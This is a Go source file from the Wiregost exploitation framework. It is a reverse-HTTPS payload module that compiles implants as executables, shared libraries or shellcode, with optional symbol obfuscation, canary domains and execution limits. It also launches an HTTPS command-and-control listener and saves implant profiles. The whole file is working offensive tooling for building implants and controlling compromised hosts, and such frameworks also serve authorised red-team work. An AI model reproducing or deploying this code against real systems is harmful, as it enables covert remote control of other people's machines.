// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

// CHANGE THE NAME OF THE PACKAGE WITH THE NAME OF YOUR MODULE/DIRECTORY
package reverse_https

import (
	"errors"
	"fmt"
	"path/filepath"
	"strconv"
	"strings"
	"sync"

	"github.com/evilsocket/islazy/fs"

	consts "github.com/maxlandon/wiregost/client/constants"
	pb "github.com/maxlandon/wiregost/protobuf/client"
	"github.com/maxlandon/wiregost/server/assets"
	"github.com/maxlandon/wiregost/server/c2"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
	"github.com/maxlandon/wiregost/server/log"
	"github.com/maxlandon/wiregost/server/module/templates"
)

// metadataFile - Full path to module metadata
var metadataFile = filepath.Join(assets.GetModulesDir(), "payload/multi/single/reverse_https/metadata.json")

// [ Base Methods ] ------------------------------------------------------------------------//

// ReverseHTTPS - A single stage MTLS implant
type ReverseHTTPS struct {
	Base *templates.Module
}

// New - Instantiates a reverse MTLS module, empty.
func New() *ReverseHTTPS {
	return &ReverseHTTPS{Base: &templates.Module{}}
}

// Init - Module initialization, loads metadata. ** DO NOT ERASE **
func (s *ReverseHTTPS) Init() error {
	return s.Base.Init(metadataFile)
}

// ToProtobuf - Returns protobuf version of module
func (s *ReverseHTTPS) ToProtobuf() *pb.Module {
	return s.Base.ToProtobuf()
}

// SetOption - Sets a module option through its base object.
func (s *ReverseHTTPS) SetOption(option, name string) {
	s.Base.SetOption(option, name)
}

// [ Module Methods ] ------------------------------------------------------------------------//

var rpcLog = log.ServerLogger("rpc", "server")

// Run - Module entrypoint. ** DO NOT ERASE **
func (s *ReverseHTTPS) Run(command string) (result string, err error) {

	action := strings.Split(command, " ")[0]

	switch action {
	case "run":
		return s.CompileImplant()
	case "to_listener":
		return s.toListener()
	case "parse_profile":
		return s.parseProfile(command)
	case "to_profile":
		return s.generateProfile(command)
	}

	return "", nil
}

func (s *ReverseHTTPS) CompileImplant() (result string, err error) {
	c, err := s.ToGhostConfig()
	if err != nil {
		return "", err
	}

	go generate.CompileGhost(*c)

	return fmt.Sprintf("Started compiling HTTPS implant"), nil
}

func (s *ReverseHTTPS) toListener() (result string, err error) {
	host := s.Base.Options["LHost"].Value
	portUint, _ := strconv.Atoi(s.Base.Options["LPort"].Value)
	port := uint16(portUint)
	addr := fmt.Sprintf("%s:%d", host, port)
	domain := s.Base.Options["Domain"].Value
	website := s.Base.Options["Website"].Value
	letsEncrypt := false
	if s.Base.Options["LetsEncrypt"].Value == "true" {
		letsEncrypt = true
	}

	certFile, _ := fs.Expand(s.Base.Options["Certificate"].Value)
	keyFile, _ := fs.Expand(s.Base.Options["Key"].Value)
	cert, key, err := getLocalCertificatePair(certFile, keyFile)
	if err != nil {
		return "", errors.New(fmt.Sprintf("Failed to load local certificate %v", err))
	}

	conf := &c2.HTTPServerConfig{
		Addr:    addr,
		LPort:   port,
		Secure:  true,
		Domain:  domain,
		Website: website,
		Cert:    cert,
		Key:     key,
		ACME:    letsEncrypt,
	}

	server := c2.StartHTTPSListener(conf)
	if server == nil {
		return "", errors.New("HTTP Server instantiation failed")
	}

	job := &core.Job{
		ID:          core.GetJobID(),
		Name:        "https",
		Description: fmt.Sprintf("HTTPS C2 server (https for domain %s)", conf.Domain),
		Protocol:    "tcp",
		Port:        port,
		JobCtrl:     make(chan bool),
	}

	core.Jobs.AddJob(job)
	cleanup := func(err error) {
		server.Cleanup()
		core.Jobs.RemoveJob(job)
		core.EventBroker.Publish(core.Event{
			Job:       job,
			EventType: consts.StoppedEvent,
			Err:       err,
		})
	}
	once := &sync.Once{}

	go func() {
		var err error
		if server.Conf.ACME {
			err = server.HTTPServer.ListenAndServeTLS("", "") // ACME manager pulls the certs under the hood
		} else {
			err = listenAndServeTLS(server.HTTPServer, conf.Cert, conf.Key)
		}
		if err != nil {
			rpcLog.Errorf("HTTPS listener error %v", err)
			once.Do(func() { cleanup(err) })
			job.JobCtrl <- true // Cleanup other goroutine
		}

	}()

	go func() {
		<-job.JobCtrl
		once.Do(func() { cleanup(nil) })
	}()

	return fmt.Sprintf("Reverse HTTPS listener started at %s:%d", host, port), nil
}

func (s *ReverseHTTPS) parseProfile(name string) (result string, err error) {
	profileName := strings.Split(name, " ")[1]

	profile, err := generate.ProfileByName(profileName)
	if err != nil {
		return "", err
	}

	// C2
	if profile.HTTPc2Enabled {
		urls := []string{}
		for _, d := range profile.C2 {
			if strings.HasPrefix(d.URL, "https") {
				url := strings.TrimPrefix(d.URL, "https://")
				urls = append(urls, url)
			}
		}
		s.Base.Options["DomainsHTTP"].Value = strings.Join(urls, ",")
	}

	// Canaries
	if len(profile.CanaryDomains) != 1 {
		domains := []string{}
		for _, d := range profile.CanaryDomains {
			domains = append(domains, d)
		}
		s.Base.Options["Canaries"].Value = strings.Join(domains, ",")
	}

	// Format
	switch profile.Format {
	case 0:
		s.Base.Options["Format"].Value = "shared"
	case 1:
		s.Base.Options["Format"].Value = "shellcode"
	case 2:
		s.Base.Options["Format"].Value = "exe"
	}

	// Other fields
	s.Base.Options["Arch"].Value = profile.GOARCH
	s.Base.Options["OS"].Value = profile.GOOS
	s.Base.Options["MaxErrors"].Value = strconv.Itoa(profile.MaxConnectionErrors)
	s.Base.Options["ObfuscateSymbols"].Value = strconv.FormatBool(profile.ObfuscateSymbols)
	s.Base.Options["Debug"].Value = strconv.FormatBool(profile.Debug)
	s.Base.Options["LimitHostname"].Value = profile.LimitHostname
	s.Base.Options["LimitUsername"].Value = profile.LimitUsername
	s.Base.Options["LimitDatetime"].Value = profile.LimitDatetime
	s.Base.Options["LimitDomainJoined"].Value = strconv.FormatBool(profile.LimitDomainJoined)
	s.Base.Options["ReconnectInterval"].Value = strconv.Itoa(profile.ReconnectInterval)

	return fmt.Sprintf("Profile %s parsed", profile.Name), nil
}

func (s *ReverseHTTPS) generateProfile(name string) (result string, err error) {
	profileName := strings.Split(name, " ")[1]

	c, err := s.ToGhostConfig()
	if err != nil {
		return "", err
	}

	// Save profile
	c.Name = profileName
	if 0 < len(c.Name) && c.Name != "." {
		rpcLog.Infof("Saving new profile with name %#v", c.Name)
		err = generate.ProfileSave(c.Name, c)
	} else {
		err = errors.New("Invalid profile name")
		return "", err
	}

	return fmt.Sprintf("Saved reverse DNS implant profile with name %#v", c.Name), nil
}

func (s *ReverseHTTPS) ToGhostConfig() (c *generate.GhostConfig, err error) {
	c = &generate.GhostConfig{}

	// OS
	targetOS := s.Base.Options["OS"].Value
	if targetOS == "mac" || targetOS == "macos" || targetOS == "m" || targetOS == "osx" {
		targetOS = "darwin"
	}
	if targetOS == "win" || targetOS == "w" || targetOS == "shit" {
		targetOS = "windows"
	}
	if targetOS == "unix" || targetOS == "l" {
		targetOS = "linux"
	}

	// Arch
	arch := s.Base.Options["Arch"].Value
	if arch == "x64" || strings.HasPrefix(arch, "64") {
		arch = "amd64"
	}
	if arch == "x86" || strings.HasPrefix(arch, "32") {
		arch = "386"
	}

	// Format
	var outputFormat pb.GhostConfig_OutputFormat
	format := s.Base.Options["Format"].Value
	switch format {
	case "shared":
		outputFormat = pb.GhostConfig_SHARED_LIB
		c.IsSharedLib = true
	case "shellcode":
		outputFormat = pb.GhostConfig_SHELLCODE
		c.IsSharedLib = true
	case "exe":
		outputFormat = pb.GhostConfig_EXECUTABLE
		c.IsSharedLib = false
	default:
		outputFormat = pb.GhostConfig_EXECUTABLE
		c.IsSharedLib = false
	}

	// HTTP C2
	c2s := generate.ParseHTTPc2ToStruct(s.Base.Options["DomainsHTTP"].Value)
	if len(c2s) == 0 {
		return nil, errors.New("You must specify at least one HTTPS C2 endpoint")
	}

	// Canary Domains
	canaries := strings.Split(s.Base.Options["Canaries"].Value, ",")
	if canaries[0] != "" {
		c.CanaryDomains = strings.Split(s.Base.Options["Canaries"].Value, ",")
	}

	// Populate fields
	c.GOOS = targetOS
	c.GOARCH = arch
	c.Format = outputFormat
	c.C2 = c2s
	c.HTTPc2Enabled = true
	c.Debug, _ = strconv.ParseBool(s.Base.Options["Debug"].Value)
	c.ObfuscateSymbols, _ = strconv.ParseBool(s.Base.Options["ObfuscateSymbols"].Value)
	c.MaxConnectionErrors, _ = strconv.Atoi(s.Base.Options["MaxErrors"].Value)
	c.ReconnectInterval, _ = strconv.Atoi(s.Base.Options["ReconnectInterval"].Value)
	c.LimitDomainJoined, _ = strconv.ParseBool(s.Base.Options["LimitDomainJoined"].Value)
	c.LimitHostname = s.Base.Options["LimitHostname"].Value
	c.LimitUsername = s.Base.Options["LimitUsername"].Value
	c.LimitDatetime = s.Base.Options["LimitDatetime"].Value

	return c, nil
}
